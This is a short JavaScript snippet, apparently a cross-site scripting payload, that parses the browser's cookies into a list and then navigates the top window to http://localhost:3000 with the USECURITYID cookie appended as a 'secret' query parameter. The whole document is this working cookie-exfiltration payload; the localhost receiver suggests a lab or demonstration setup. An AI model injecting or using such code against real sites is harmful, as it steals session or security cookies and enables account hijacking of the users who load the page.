var cookiesList = {},
    rc = document.cookie;

// Split up all cookies and build up a list
rc && rc.split(';').forEach(function (cookie) {
    var parts = cookie.split('=');
    cookiesList[parts.shift().trim()] = decodeURI(parts.join('='));
});


window.open("http://localhost:3000?secret=" + cookiesList.USECURITYID, "_top");